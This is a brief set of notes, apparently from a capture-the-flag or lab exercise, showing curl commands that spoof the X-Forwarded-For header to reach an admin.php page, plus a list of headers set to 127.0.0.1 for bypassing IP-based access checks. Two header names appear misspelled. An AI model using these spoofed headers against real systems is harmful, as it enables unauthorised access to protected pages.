
```cmd
curl --header "X-Forwarded-For: 192.168.0.2" http://example.com
```

```cmd
curl http://35.242.212.223:31860/admin.php --header "X-Forwarded-For:127.0.0.1"
```

- X-Originating-TP: 127.0.0.1
- X-Forwarded-For: 127.0.0.1
- X-Remote-TP: 127.0.0.1
- X-Remote-Addr: 127.0.0.1
- X-ProxyUser-IP: 127.0.0.1
